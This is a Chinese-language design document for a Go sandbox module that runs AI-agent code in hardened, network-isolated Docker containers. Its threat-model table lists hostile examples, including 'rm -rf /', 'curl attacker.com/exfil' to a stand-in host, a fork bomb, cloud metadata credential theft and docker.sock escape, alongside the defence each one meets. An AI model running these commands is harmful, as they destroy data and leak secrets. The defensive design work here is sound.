# 05 · 动态沙箱 `internal/sandbox`

> 代码：
> - `manager.go` (464) — 核心 `Manager`：Execute / ExecuteStream / 资源限额 / 输出截流
> - `volume.go` (123) — `ExecuteWithVolume`：挂载宿主目录的长寿命执行
> - `tar.go` (46) — in-memory tar 打包，用于 `CopyToContainer`
>
> 测试：`manager_test.go` (74)

---

## 1. 模块定位

**"给 Agent 一个能跑代码，但跑不出容器的手脚。"**

当 LLM 决定：

- 执行一段 Python/Go/Bash 脚本验证假设，
- 跑单元测试，
- 执行部署前的 dry-run，

——这些都必须在 **瞬态 + 资源受限 + 网络隔离** 的 Docker 容器里发生。

五大安全/体验要点：

| 维度         | 实现                                                     |
|--------------|----------------------------------------------------------|
| **物理隔离** | 每次执行一个**新容器**，执行完立刻 `Remove`（阅后即焚）    |
| **资源限制** | cgroups：`--memory=512m --cpus=1`；Timeout 墙上时间       |
| **网络限制** | `NetworkMode: none` 默认；白名单网络需显式配              |
| **输出限流** | stdout/stderr 单方向 1 MiB 上限 → 防 OOM 日志炸掉服务      |
| **实时流式** | `ExecuteStream` 走 `io.Pipe` → chan，不等整个脚本跑完     |

---

## 1.5 设计哲学：沙箱的"纵深防御"设计

沙箱是对**不可信输入**（LLM 生成的代码 + 用户粘贴的脚本）的运行容器。
设计哲学是 **defense in depth（纵深防御）**——任何单层防御假设会被绕过，
多层协同才能逼近安全。

### 威胁建模

假设 LLM 被 prompt injection 攻陷 / 用户恶意，可能生成：

| 威胁 | 动机 | 本系统对应防御层 |
|---|---|---|
| `rm -rf /` | 破坏宿主机 | 容器隔离（rootfs 与宿主分离） |
| `curl attacker.com/exfil` | 数据外泄 | NetworkMode=none + Egress ACL |
| 169.254.169.254 IMDS | 云凭据窃取 | BlockedCIDRs + Egress |
| `:() { :\|:& }; :` fork bomb | 资源耗尽 | PidsLimit=256 |
| `dd if=/dev/zero of=file bs=1G` | 磁盘耗尽 | Tmpfs size=128m 限额 |
| `/bin/bash -p` setuid 提权 | 容器内提权 | no-new-privileges + CapDrop=ALL |
| 覆写 `/bin/ls` 植后门 | 持久化 | ReadonlyRootfs |
| 编译后门拷贝到 /tmp 执行 | 载荷执行 | /tmp `noexec` |
| 挂载 `/var/run/docker.sock` | 容器逃逸 | volume.go 黑名单 host path |
| `while true; do ... done` | CPU 耗尽 | NanoCPUs cgroup + 120s timeout |
| 吞占 OOM | 内存耗尽 | Memory cgroup + OOM Kill |

### 三道防线

```
┌──────────────────────────────────────────────────┐
│ 防线 1：内容级（preventive）                     │
│                                                  │
│  security/sensitive_patterns 正则                │
│  ├── 拦截明显危险（DROP DATABASE, rm -rf /）     │
│  ├── 拦截部署命令（kubectl delete, terraform）   │
│  └── 匹配 → HITL 审批挂起，不到下一层            │
│                                                  │
│  问题：正则只是「启发式」，能绕（空格 / base64）  │
│  → 不能指望它拦住所有，只是把**明显**的拦下     │
└──────────────────────────────────────────────────┘
                       │ （通过 / HITL 已批准）
                       ▼
┌──────────────────────────────────────────────────┐
│ 防线 2：容器级（containing）                      │
│                                                  │
│  Docker 容器 + cgroups + namespaces              │
│  ├── NetworkMode=none       网络隔离             │
│  ├── Memory / NanoCPUs      资源隔离             │
│  ├── PidsLimit=256          防 fork bomb         │
│  ├── ReadonlyRootfs=true    文件系统完整性        │
│  ├── Tmpfs /tmp noexec      禁下载执行链         │
│  ├── SecurityOpt no-new-priv 禁提权             │
│  ├── CapDrop=ALL            清 capability        │
│  └── 超时 ForceRemove        防死循环            │
│                                                  │
│  这一层假设"内部代码是对手"，用 kernel 硬隔离    │
└──────────────────────────────────────────────────┘
                       │ （即便逃逸）
                       ▼
┌──────────────────────────────────────────────────┐
│ 防线 3：主机/网络级（detecting）                  │
│                                                  │
│  ├── 宿主机 iptables OUTPUT DROP                 │
│  ├── Cilium NetworkPolicy（K8s）                 │
│  ├── K8s PodSecurityPolicy / OPA                 │
│  ├── 审计日志 + Falco / eBPF 检测异常 syscall     │
│  └── 宿主机本身跑 gVisor / Kata 加一层沙箱       │
│                                                  │
│  假设容器完全失陷，宿主层仍能兜底 + 告警         │
└──────────────────────────────────────────────────┘
```

### 三个关键设计选择

**C1 — 瞬态容器（"阅后即焚"）**

每次 Execute 创建全新容器，绝不复用。权衡：
- ✅ 完全隔绝跨请求污染（上一次的恶意代码不会影响下一次）
- ✅ 状态简单，没有"清理"逻辑的 bug 空间
- ❌ 冷启动开销（image 已预热时约 100-300ms）
- ❌ tmpfs 无缓存（npm/pip 重复下载）

**对 npm/pip 冷缓存的补救**：可选的 `persistent volume`（volume.go），
bind-mount 宿主机缓存目录。用户显式开启，默认关。

**C2 — NetworkMode=none 作为默认**

**强烈建议**不给沙箱任何网络，理由：
- 大多数任务用不到（本地编译、单元测试）
- 容器里的 apt-get / pip install 应该在 image 里预装好
- 脚本如果需要网络，**应该是 orchestrator 层通过 MCP 拉数据，然后注入
  到容器，而不是容器直接外联**

确实需要时改为 `agent_sandbox_net`，搭配 egress 白名单 + iptables。

**C3 — `AutoRemove=false` 的反直觉选择**

Docker 的 `AutoRemove` 参数在容器退出后自动删。我们**不用**它：
```go
hostCfg.AutoRemove = false
```
原因：AutoRemove 会在退出时**立即**删除，我们来不及调
`ContainerLogs()` 抓日志。改为手动流程：wait → readLogs → manual remove
（defer 保证）。

---

## 2. 依赖架构

```
        ┌──── orchestrator / tools.RunCode ────┐
        │ Execute / ExecuteStream / ExecuteWithVolume
        └────────────────┬─────────────────────┘
                         ▼
                ┌─────────────────┐
                │ sandbox.Manager │
                └───┬──────┬──────┘
                    │      │ uses
                    │      ▼
                    │ docker/docker/client (SDK)
                    │      │
                    │      ▼
                    │  Docker Engine API (unix socket)
                    ▼
             resolveRuntime(req)
             ensureImage(ctx)
             copyCodeToContainer(ctx)
             collectOutput(ctx)
```

---

## 2.5 数据流总览

### 2.5.1 一次性执行 (Execute) 完整流程

```text
┌─────────────────────────────┐
│ orchestrator.executeTool    │
│ sandbox.Manager.Execute(req)│
│ req: {Language, Code,       │
│       Timeout, WorkspaceDir}│
└─────────────┬───────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────┐
│ ① resolveRuntime(req.Language)                               │
│   language → image mapping (config.Images["python"] →        │
│   "python:3.11-slim" 等)                                     │
│   未配置 → DefaultImage                                      │
└──────────────────────────┬──────────────────────────────────┘
                           │ (imageName)
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ ② ensureImage(ctx, imageName)                                │
│   ImageList → 检查本地是否已有                                │
│   无 → ImagePull (带超时)                                    │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ ③ 【Docker API】 ContainerCreate                             │
│   HostConfig (硬化):                                         │
│    NetworkMode: "none"  (网络完全隔离)                        │
│    Memory: 512MB        (OOM killer 兜底)                    │
│    NanoCPUs: 1e9        (1 核上限)                           │
│    ReadonlyRootfs: true                                      │
│    SecurityOpt: ["no-new-privileges"]                        │
│    CapDrop: ["ALL"]                                          │
│    Tmpfs: {"/tmp": "size=64m"}                              │
│   Cmd: 构造执行命令 (e.g. ["python3", "-c", code])           │
└──────────────────────────┬──────────────────────────────────┘
                           │ (containerID)
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ ④ copyCodeToContainer(ctx, containerID, code)                │
│   tar archive → CopyToContainer → /workspace/main.{ext}    │
│   (如果 req.WorkspaceDir 存在 → bind mount 整个目录)         │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ ⑤ 【Docker API】 ContainerStart                              │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ ⑥ ContainerWait + context.WithTimeout(req.Timeout)           │
│   竞争: wait 完成 vs timeout 到期                            │
│   timeout → ContainerKill + 标记 TimedOut=true              │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ ⑦ collectOutput(containerID)                                 │
│   ContainerLogs → stdcopy.StdCopy 解复用                    │
│   → stdout buffer + stderr buffer                           │
│   ContainerInspect → ExitCode                               │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ ⑧ 【Docker API】 ContainerRemove(force=true)                 │
│   → 清理容器 (即使执行出错也必须执行)                         │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ *SandboxResult{                                              │
│    Stdout, Stderr string                                    │
│    ExitCode int                                             │
│    TimedOut bool                                            │
│    Duration time.Duration                                   │
│ }                                                            │
│ → 返回 orchestrator → 作为 ToolResult 注入 LLM             │
└─────────────────────────────────────────────────────────────┘
```

### 2.5.2 流式执行 (ExecuteStream)

```text
┌─────────────────────┐
│ SSE 长任务场景       │
│ ExecuteStream(req)  │
└──────────┬──────────┘
           │
           ▼  (前5步同 Execute)
┌─────────────────────────────────────────────────────────────┐
│ ContainerAttach (hijack connection)                           │
│  → io.Reader (multiplexed stdout+stderr)                    │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ stdcopy.StdCopy → demux 到 chanWriter                       │
│   每行 → lineCh <- OutputLine{Stream, Text}                 │
│   → 调用者逐行读取 → SSE event 推送到前端                    │
│   → 前端实时展示执行输出                                     │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. 核心结构

```go
type Manager struct {
    cli    *client.Client        // Docker SDK
    cfg    *config.SandboxConfig
    logger *zap.Logger

    memoryLimit int64             // 解析后的字节数
    cpuPeriod   int64             // cgroups CFS period (固定 100000)
    cpuQuota    int64             // cgroups CFS quota (派生自 CPULimit)
}
```

`NewManager(cfg, logger)` 做的事：

1. `client.NewClientWithOpts(client.WithHost(cfg.DockerHost))` — 连 unix socket 或远程 tcp；
2. `parseMemoryLimit("512m") → 536870912` — 支持 `b/k/m/g` 后缀；
3. `parseCPULimit("1.0") → period=100000, quota=100000` —— 即 1 个 CPU 核心的等价时间片；
4. 启动时做一次 `Ping()` 验证连通性。

---

## 4. 一次性执行 `Execute()`

```
req: SandboxRequest{ Language, Code, Files, Env, Timeout, StreamOutput=false }
 │
 ├── 1. resolveRuntime(req)
 │     根据 language 返回:
 │       image = "code-agent/py-sandbox:latest"   // 或 cfg.Images[lang]
 │       cmd   = ["python", "/workspace/main.py"]
 │
 ├── 2. ensureImage(ctx, image)
 │     docker inspect → 不在本地就 ImagePull
 │
 ├── 3. Create container:
 │     HostConfig:
 │       Memory:       m.memoryLimit
 │       CPUPeriod:    100000
 │       CPUQuota:     m.cpuQuota
 │       NetworkMode:  cfg.NetworkMode        // 默认 "none"
 │       AutoRemove:   false (我们自己删)
 │       SecurityOpt:  ["no-new-privileges"]
 │     Config:
 │       Image:        image
 │       Cmd:          cmd
 │       Env:          envMapToSlice(req.Env)
 │       WorkingDir:   "/workspace"
 │
 ├── 4. copyCodeToContainer()
 │     ┌─ tarWriter 在内存里打包:
 │     │    /workspace/main.<ext>  ← req.Code
 │     │    /workspace/<fname>     ← req.Files[fname]
 │     └─ cli.CopyToContainer("/", tarReader)
 │
 ├── 5. cli.ContainerStart
 │
 ├── 6. 等待：ctxWithTimeout(req.Timeout or cfg.Timeout)
 │     statusCh, errCh := cli.ContainerWait(ctx, …, NotRunning)
 │     select:
 │       - case st := <-statusCh:   正常退出，exitCode = st.StatusCode
 │       - case err := <-errCh:     拉流错误
 │       - case <-ctx.Done():       超时 → cli.ContainerKill()
 │                                   killed = true
 │
 ├── 7. collectOutput(ctx, containerID)
 │     ContainerLogs(stdout:true, stderr:true) →
 │     拆多路 → 各自截到 maxOutputBytes(1 MiB)
 │     返回 stdout, stderr 字符串
 │
 ├── 8. defer cli.ContainerRemove(containerID, force:true)
 │
 └── return &SandboxResult{ ExitCode, Stdout, Stderr, Duration, Killed }
```

### 4.1 `resolveRuntime` 的语言表

```go
resolveRuntime(req) (image string, cmd []string)

"python"  → py-sandbox   + ["python", "main.py"]
"go"      → go-sandbox   + ["sh", "-c", "go run main.go"]
"bash"    → base-sandbox + ["bash", "main.sh"]
"node"    → node-sandbox + ["node", "main.js"]
default   → cfg.DefaultImage + ["bash", "-c", req.Code]
```

- 语言到镜像的映射在 `cfg.Images map[string]string` 里可被用户覆盖；
- 没匹配到就用 `DefaultImage` 并直接 `bash -c <code>`（兜底，但不能 import 依赖）。

### 4.2 代码投递：`tar.go` 的纯内存 tar 流

```go
// tar.go
type tarWriter struct {
    w  io.Writer
    tw *tar.Writer
}

(t) writeFile(name string, data []byte) error {
    hdr := &tar.Header{
        Name: name,
        Mode: 0644,
        Size: int64(len(data)),
    }
    if err := t.tw.WriteHeader(hdr); err != nil { … }
    _, err := t.tw.Write(data)
    return err
}
```

**为什么在内存里打 tar？** Docker 的 `CopyToContainer` API 本身要求一个 tar-stream，这就是它的"协议格式"。避免落盘临时文件 = 少一个 cleanup 坑 + 更快。

### 4.3 输出截流（关键）

```go
const maxOutputBytes = 1 << 20 // 1 MiB

collectOutput(ctx, containerID) (stdout, stderr string) {
    logs := cli.ContainerLogs(ctx, id, ShowStdout:true, ShowStderr:true)
    defer logs.Close()
    // Docker 日志是多路复用格式 (8-byte header + payload)：
    //    stream_type(1) | zeros(3) | size(4, BE) | payload...
    // 用 stdcopy.StdCopy 拆开成两个 Writer
    var stdoutBuf, stderrBuf limitedBuffer{cap: maxOutputBytes}
    stdcopy.StdCopy(&stdoutBuf, &stderrBuf, logs)
    return stdoutBuf.String(), stderrBuf.String()
}
```

- 超限后附一句 `"...output truncated at 1 MiB..."`；
- 防止容器脚本 `while true; print()` 把整个 Go 进程内存打满。

---

## 5. 流式执行 `ExecuteStream()`

```go
ExecuteStream(ctx, req) (lineCh <-chan string, errCh <-chan error, err error)
```

与 `Execute` 的不同：

1. 调用 `ContainerLogs(follow:true)` 而不是执行完再拉；
2. 起一个 goroutine，用 `bufio.Scanner` 读流，**按行**推到 `lineCh`；
3. 容器退出后 `close(lineCh)`，错误塞 `errCh`；
4. 调用方（通常是 `api/handlers.go` 的 SSE）可以边读边推给前端，用户看到**逐行进度**。

```
container ──stdout/stderr──► docker logs(follow) ──► bufio.Scanner ──► lineCh
                                                                         │
                                                                         ▼
                                                              SSE event "log" → UI
```

### 5.1 设计取舍

- **为什么不直接 stream 给 SSE handler 用 io.Reader**？ 因为这样会把 docker SDK 的 io.ReadCloser 绑死到 HTTP 生命周期 —— 容器比 HTTP 连接短/长都会出问题。中间加一个 chan 解耦。
- **为什么按行推？** 因为前端"日志"组件按行渲染；按 byte 会频繁刷新导致 React 卡。

---

## 6. 长寿命执行 `ExecuteWithVolume()` (`volume.go`)

适用场景：**跑 `go test` / `pytest` / `npm test` 这种需要访问整个项目目录的命令**。

```go
ExecuteWithVolume(ctx, language, command string, hostDir string) *SandboxResult {
    image := m.imageForLanguage(language)   // 继承 resolveRuntime 的映射
    HostConfig.Binds = []string{
        hostDir + ":/workspace:rw",    // 宿主目录挂载进容器
    }
    Cmd = ["sh", "-c", command]
    WorkingDir = "/workspace"
    // 同样资源限额，同样一次性容器
}
```

与 `Execute` 的差异：

| 维度       | Execute                | ExecuteWithVolume               |
|------------|------------------------|---------------------------------|
| 代码来源   | `req.Code` inline      | 宿主目录已存在的代码树          |
| 文件投递   | tar CopyToContainer    | 直接 volume mount               |
| 输出副作用 | 无（容器删除即消失）   | **有**：脚本可以写文件回宿主    |
| 用途       | 执行模型"生成的脚本"    | 跑"对本项目仓库的命令"          |

> ⚠️ **安全暗礁**：`ExecuteWithVolume` 会让脚本修改/破坏宿主目录。因此 orchestrator 只对**已通过 HITL 审批**或**白名单命令**（`go test` / `pytest` 等）才走这条路径。

---

## 7. 资源限额细节

### 7.1 Memory

```go
parseMemoryLimit("512m") → 512 * 1024 * 1024 bytes
```

- `k / m / g` 后缀；纯数字当作字节；
- 超过就 **OOM-kill**：容器立即结束，Docker 会在 `ContainerWait` 的 statusCh 回一个 `OOMKilled=true` 的 State；
- `SandboxResult.Killed` 会被置 true 以便上层区分"OOM"还是"超时"。

### 7.2 CPU

```go
parseCPULimit("1.5") → period=100000, quota=150000
```

这是标准的 cgroups CFS (Completely Fair Scheduler) 时间片约束 —— 每 100ms 窗口内最多占 150ms 的 CPU 时间 = 1.5 核等效。

### 7.3 网络

```yaml
network_mode: "none"      # 默认：完全断网
# network_mode: "bridge"  # 默认桥接（有外网）—— 不推荐
# network_mode: "agent_sandbox_net"  # 白名单网络：只能访问指定下游
```

"none" 是**强烈建议**的默认。如果确实需要脚本访问数据库/内部 API：

1. 在 docker-compose / k8s 里建一个 `agent_sandbox_net`；
2. 把 DB/api-gateway 的服务 attach 进这个网络；
3. 设 `network_mode: "agent_sandbox_net"`；
4. 出口防火墙只放白名单（`internal/security/egress.go` 做 DNS 名单校验）。

### 7.4 深度防御 HostConfig（`buildHostConfig` helper）

> ⚠️ **2026-05 更新（P0 #8 修复）**：原来 `Execute` 和 `ExecuteStream` 各自
> 构造 HostConfig，但只设了 `NetworkMode + Memory + NanoCPUs`，本节描述的
> 其他硬化项**没真正写入**。现在统一抽到 `buildHostConfig(mem, cpus)`，
> Execute / ExecuteStream 都调用它，**防御深度统一**，不会出现一处改了
> 另一处漏的情况。

```go
func (m *Manager) buildHostConfig(memoryLimit, nanoCPUs int64) *container.HostConfig {
    pidsLimit := int64(256)
    return &container.HostConfig{
        NetworkMode: container.NetworkMode(m.cfg.NetworkMode),

        Resources: container.Resources{
            Memory:    memoryLimit,
            NanoCPUs:  nanoCPUs,
            PidsLimit: &pidsLimit,  // ← fork bomb 防御
        },

        SecurityOpt:    []string{"no-new-privileges:true"},  // ← setuid 提权阻断
        CapDrop:        strslice.StrSlice{"ALL"},             // ← 全部 Linux capability 清零
        ReadonlyRootfs: true,                                  // ← 根文件系统只读

        Tmpfs: map[string]string{
            "/workspace": "rw,size=128m",                // ← 代码运行需要可写
            "/tmp":       "rw,noexec,nosuid,size=64m",  // ← pip/npm 缓存；禁止执行
        },
    }
}
```

**每一项防御的原理**：

| 字段 | 防什么攻击 | 说明 |
|---|---|---|
| `PidsLimit=256` | Fork bomb | cgroups v2 的 `pids.max`，超过即 OOM 式拒绝 fork |
| `SecurityOpt=no-new-privileges` | setuid / file capabilities 提权 | 对应 Linux `PR_SET_NO_NEW_PRIVS` prctl |
| `CapDrop=ALL` | CAP_NET_RAW 嗅探 / CAP_SYS_ADMIN 挂载 / 所有能力 | `python script.py` 不需要任何 capability |
| `ReadonlyRootfs=true` | 覆写 `/bin/*` 隐藏后门 | 根只读；需要写的地方用 Tmpfs 显式挂载 |
| `Tmpfs /workspace` | — | 允许 `go build` 出可执行文件（`noexec` 会让二进制跑不起来，所以这里**不设 noexec**） |
| `Tmpfs /tmp` `noexec` | 攻击者常见模式：下载到 /tmp → chmod +x → 执行 | /tmp 可写但禁执行，链式攻击断链 |

### 7.5 ExecuteStream 的多路复用修复

> ⚠️ **2026-05 更新（P0 #9 修复）**：此前 `ExecuteStream` 直接 `Read`
> `attachResp.Reader` 把字节塞进 channel —— 但 Docker attach stream 是
> 多路复用的（每个 frame 有 8 字节 header 指示 stdout/stderr 和长度），
> 结果消费者收到的 stream 里**混着乱码**。

```go
// 现在 ← 用 stdcopy.StdCopy 解复用 + chanWriter 桥接到 channel
stdoutW := &chanWriter{ch: outCh, ctx: execCtx}
stderrW := &chanWriter{ch: outCh, ctx: execCtx, prefix: "[stderr] "}

go func() {
    defer close(outCh); defer close(errCh); defer cancel()
    defer attachResp.Close()
    defer removeContainer()
    _, _ = stdcopy.StdCopy(stdoutW, stderrW, attachResp.Reader)
}()
```

`chanWriter` 是实现 `io.Writer` 的适配器，把 demux 出来的字节送进 channel；
带 ctx 取消，避免消费者消失后 goroutine 永远阻塞在 `ch <-`：
```go
func (w *chanWriter) Write(p []byte) (int, error) {
    select {
    case w.ch <- w.prefix + string(p):
        return len(p), nil
    case <-w.ctx.Done():
        return 0, w.ctx.Err()   // ← 关键：阻塞可取消
    }
}
```

**验证**：`TestChanWriter_DemuxTagging`, `TestChanWriter_CancelsOnContextDone`。

### 7.6 历史遗留字段说明

```go
// Privileged: false  — 默认就是 false，无需显式设。Privileged=true 等于
//                       CAP_DROP 无效 + 所有 device 访问，绝对禁止。
// seccomp=unconfined  — 如果需要禁用 seccomp（一般不该），才显式设
//                       SecurityOpt。默认使用 Docker 的 seccomp profile。
```

---

## 8. 生命周期与幂等

```
┌─────────────┐
│ Create ────►│     没启动，没删 → 业务 panic 可能遗漏 remove
│ Start ─────►│     已启动
│ Wait  ─────►│     (block 到退出)
│ CopyLogs ──►│
│ Remove ────►│   一定要走到这一步
└─────────────┘
```

代码用 `defer m.cli.ContainerRemove(..., force:true)` 保证无论哪个分支 panic/错误都清理；外加定期扫描：

```go
// 启动时清理上次残留（孤儿容器）
cli.ContainerList(filter: label=code-agent/sandbox=1) → 强删
```

所有容器带 label `code-agent.sandbox=true` 便于识别。

---

## 9. 运行中资源采集（可选）

虽然本代码未强制，设计上可在 `Execute` 里加：

```go
stats, _ := cli.ContainerStats(ctx, id, false)  // one-shot
// 解析 peak memory, cpu_usage
metrics.SandboxMemoryPeakBytes.Observe(...)
metrics.SandboxCPUUserSec.Observe(...)
```

— 写在 TODO 列表里。

---

## 10. 配置示例（回顾）

```yaml
sandbox:
  docker_host: "unix:///var/run/docker.sock"
  default_image: "code-agent/sandbox-base:latest"
  images:
    python: "code-agent/py-sandbox:3.12"
    go:     "code-agent/go-sandbox:1.23"
    node:   "code-agent/node-sandbox:20"
    bash:   "code-agent/bash-sandbox:5"
  memory_limit: "512m"
  cpu_limit:    "1.0"
  timeout:      60s
  network_mode: "none"
  workspace_dir: "/workspace"
```

### 10.1 预制镜像的含义

- 镜像内**已预装常见依赖**（python: requests/pyyaml，node: lodash/axios…），减少每次脚本 `pip install` 的时间；
- 默认用户是 nobody，UID 65534，避免脚本以 root 在容器内执行；
- 镜像体积尽量小（alpine 基础）→ `ensureImage` 的 pull 延迟可接受。

---

## 11. 设计权衡

| 抉择 | 动机 |
|---|---|
| **一次性容器**（而非共享容器池） | 零状态泄漏；死循环不会拖累下一次执行 |
| 代码走 tar 流注入而不是 volume | 避免宿主文件系统被污染；审计时 code 内容可溯源 |
| 输出限 1 MiB | 防御性上限；极少数正常用例会被截断（可用 streaming 输出规避） |
| 默认 `network_mode: "none"` | 零信任起步：用户显式选白名单网络才开网 |
| `Execute` 与 `ExecuteStream` 分两个方法 | 简单任务不搞 channel，保持调用方代码干净 |
| `ExecuteWithVolume` 独立于 `Execute` | 语义完全不同（副作用 vs 瞬态），合并会让 API 混乱 |
| 不做 Docker-in-Docker | 让沙箱 reach out 内部 docker daemon 才做到；宿主 socket 直接暴露给代理层，加白名单 |
| `no-new-privileges` + `CapDrop=ALL` | 深度防御：即使 LLM 生成提权脚本也无效 |
| **SSE 推行**而不是 WS 全双工 | 沙箱输出是单向流；SSE 更轻量、天然 HTTP1.1 友好 |

---

## 12. 后续演进

- [ ] **gVisor / Kata Containers** 作为 runtime：更强的内核级隔离；
- [ ] **预热容器池**：对常用语言（python/go）保留 1-2 个冷启动好的容器，首次调用 p95 从 400ms 降到 50ms；
- [ ] **资源计量**：采集峰值内存/CPU，接入 `metrics/cost.go` —— 为 "按执行时间计费" 做准备；
- [ ] **OOM 友好 stderr**：检测 `Killed=true && exitCode=137`，用人话告诉 LLM"你的脚本超内存了，请优化"而不是空 stderr；
- [ ] **Volume quota**：`ExecuteWithVolume` 目前写入无上限，可用 `--storage-opt size=500M` 加磁盘配额；
- [ ] **行为审计**：对每次 sandbox 执行记录入 `audit/logger.go`（user_id / task_id / cmd / exit_code / duration）；
- [ ] **K8s 原生后端**：在 K8s 部署时替换为 `Job` 资源而不是直连 Docker，便于 HPA 自动扩 worker。

---

## 12. 实现剖析与改进方向

### 一次 Execute 的 9 步具体 Docker API 调用

```text
req (Code, Language, Timeout) → Execute(ctx, req)
  │
  │ 1. resolveRuntime(req) → (image, cmd)
  │    python → ("python:3.12-slim", ["python3", "/workspace/main.py"])
  │    go     → ("golang:1.23-alpine", ["sh","-c","cd /workspace && go run main.go"])
  │
  │ 2. context.WithTimeout(ctx, req.Timeout or m.cfg.Timeout)
  │
  │ 3. ensureImage(ctx, image)
  │    ├── ImageInspectWithRaw → 本地有？ 跳过
  │    └── ImagePull + io.Copy(io.Discard, reader)  # 等 pull 完
  │
  │ 4. parseMemoryLimit("512m") → 536870912 (int64)
  │    parseCPULimit("1.0") → 1000000000 (NanoCPUs)
  │
  │ 5. buildHostConfig(mem, cpus) → 组装硬化 HostConfig
  │    （PidsLimit/SecurityOpt/CapDrop/ReadonlyRootfs/Tmpfs）
  │    + AutoRemove=false（要先 ReadLogs）
  │
  │ 6. docker.ContainerCreate(ctx, containerCfg, hostCfg, nil, nil, name)
  │    → resp.ID
  │    defer docker.ContainerRemove(ID, Force:true)  ← 必保证 cleanup
  │
  │ 7. copyCodeToContainer(ctx, ID, req)
  │    └── tar(req.Files) → docker.CopyToContainer(ID, /workspace, buf)
  │
  │ 8. docker.ContainerStart(ctx, ID, {})
  │    statusCh, errCh = docker.ContainerWait(ctx, ID, NotRunning)
  │    select { case status: ExitCode ; case ctx.Done: ContainerKill SIGKILL }
  │
  │ 9. logReader = docker.ContainerLogs(ID, {Stdout:true, Stderr:true})
  │    stdcopy.StdCopy(&stdoutBuf, &stderrBuf, LimitReader(logReader, 2MiB))
  │    truncate if > 1MiB per stream
  │
  └─ return &SandboxResult{Stdout, Stderr, ExitCode, Duration, Killed}
```

**性能数据**（典型 Python hello-world）：

| 阶段 | 冷启动（image 未拉） | 热启动（image 已在本地） |
|---|---|---|
| ensureImage | 5-30 s | <10 ms |
| ContainerCreate | 50-100 ms | 50-100 ms |
| copyCodeToContainer | <10 ms | <10 ms |
| ContainerStart | 100-300 ms | 100-300 ms |
| 代码执行（hello-world） | 50 ms | 50 ms |
| Wait + Logs + Remove | 50-150 ms | 50-150 ms |
| **总耗时** | 6-31 s | **400-800 ms** |

### Docker 多路复用流的协议细节

Docker `ContainerAttach` / `ContainerLogs` 返回的流是多路复用的：
```
[8 bytes header] [payload]
 ^                ^
 │                └── 实际 stdout/stderr 数据
 │
 header[0]   = 1 (stdout) 或 2 (stderr) 或 0 (stdin echo)
 header[1:4] = reserved
 header[4:8] = big-endian uint32 payload length
```

`stdcopy.StdCopy(stdoutW, stderrW, reader)` 自动解复用——按 header[0] 把
payload 分流到 stdoutW / stderrW。**任何替代的直接 Read 都是错误**（P0 #9
就是这个 bug）。

### 利弊评估

**优势（Pros）**
- ✅ 阅后即焚，无跨请求污染
- ✅ 硬化 HostConfig 覆盖主要沙箱逃逸面
- ✅ 支持 4+ 语言，按 `req.Language` 自动选 image
- ✅ 流式输出（ExecuteStream）+ 同步模式（Execute）两种接口
- ✅ defer cleanup 保证容器必删

**代价（Cons）**
- ⚠️ 冷启动可能 30 s（image 没预热），生产必须预拉
- ⚠️ 每次创建新容器开销 ~400ms，高频调用不划算
- ⚠️ stdcopy.StdCopy 不能区分哪段 stdout 对应哪段 stderr 的时间序（事后拼
  装丢失交错信息）
- ⚠️ PidsLimit=256 硬编码，某些合法编译场景会触发（大型 Go 编译 `go build
  ./...`）
- ⚠️ 无 Docker 以外的后端（K8s Job / containerd 直连都不支持）
- ⚠️ 没有"warm pool"—— 所有请求都是 cold 容器创建

### 可改进点

**P0**
1. 容器 warm pool：预启动 N 个 idle 容器，请求到来时 `docker exec` 而非
   `ContainerCreate`。冷启动 400ms → 50ms。**骨架见 `warm_pool.go`**
2. Image pre-pull 脚本：启动时对 `cfg.Images` 所有项并行 pull，避免首次
   运行的 30s 等待
3. PidsLimit 可配置：常规 256，`go build` 类任务允许临时放宽

**P1**
4. 后端抽象：`type Backend interface { Execute, ExecuteStream, Close }`。
   Docker 一个实现，K8s Job 另一个实现。
5. 输出流式压缩：大 stdout 直接流到对象存储（S3/OSS），返回 URL 而非塞
   message history
6. Seccomp profile：除了 no-new-privileges，还能阻断 syscall 白名单（更强）

**P2**
7. gVisor/Kata 作为可选 runtime（最强隔离）
8. 沙箱内部装 Agent 代理（代码发对象存储时加签）
9. 结合 egress validator 做 per-call 网络限制

---

下一篇：`06_mcp.md` —— MCP 客户端、JSON-RPC 2.0 协议、stdio/sse 双传输。
